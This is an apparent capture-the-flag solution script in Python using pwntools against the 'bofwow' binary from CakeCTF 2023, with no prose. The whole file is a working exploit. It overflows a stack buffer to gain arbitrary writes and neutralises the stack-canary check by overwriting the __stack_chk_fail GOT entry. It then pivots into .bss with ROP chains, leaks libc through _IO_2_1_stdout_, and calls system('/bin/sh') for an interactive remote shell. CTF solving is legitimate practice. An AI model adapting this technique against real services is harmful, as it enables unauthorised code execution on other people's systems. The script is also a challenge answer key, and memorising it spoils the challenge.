#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./bofwow_patched", checksec=False)
libc = elf.libc


def start(argv=[], *a, **kw):
    nc = "nc bofwow.2023.cakectf.com 9003"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

stack_chk_fail_got = elf.got["__stack_chk_fail"]
op_got = 0x000000404040
leave_ret = 0x00000000004014c6
ret = leave_ret + 1
pop_rbp = 0x00401568
mov_rax_prbp = 0x004015a3  # mov rax, [rbp-0x18]; leave; ret;


def aaw(addr, data):
    payload = b""
    payload += data
    payload = payload.ljust(0x110, b"\x00")
    payload += flat(
        elf.bss(0xf00),
        elf.sym["main"],
    )
    payload = payload.ljust(0x130, b"\x00")
    payload += flat(
        addr,
        0,
        0x100
    )
    io.sendlineafter(b"name? ", payload)
    io.sendlineafter(b"you? ", b"1337")


ropchain = [
    pop_rbp, elf.bss(0xec8),
    mov_rax_prbp,
]

aaw(stack_chk_fail_got, p64(ret))
aaw(op_got, p64(elf.sym["main"]))

aaw(elf.bss(0xec8 - 0x18), p64(elf.bss(0)))
aaw(elf.bss(0xec8), p64(elf.bss(0xed8)))
aaw(elf.bss(0xed0), p64(ret))
aaw(elf.bss(0xed8), p64(elf.sym["main"] + 66))

for i in range(len(ropchain)):
    aaw(elf.bss(0xe00) + i * 8, p64(ropchain[i]))

payload = b""
payload = payload.ljust(0x110, b"\x00")
payload += flat(
    elf.bss(0xdf8),
    leave_ret,
)
io.sendlineafter(b"name? ", payload)
io.sendlineafter(b"you? ", b"1337")

libc_leak = u64(io.recv(6) + b"\x00\x00")
log.info(f"{libc_leak=:#x}")
libc.address = libc_leak - libc.sym["_IO_2_1_stdout_"]
log.info(f"{libc.address=:#x}")

str_bin_sh = next(libc.search(b"/bin/sh\x00"))
system = libc.sym["system"]
pop_rdi = libc.address + 0x001bc061

ropchain = [
    pop_rdi, str_bin_sh,
    system
]

for i in range(len(ropchain)):
    aaw(elf.bss(0x800) + i * 8, p64(ropchain[i]))

payload = b""
payload = payload.ljust(0x110, b"\x00")
payload += flat(
    elf.bss(0x7f8),
    leave_ret,
)
io.sendlineafter(b"name? ", payload)
io.sendlineafter(b"you? ", b"1337")

io.interactive()
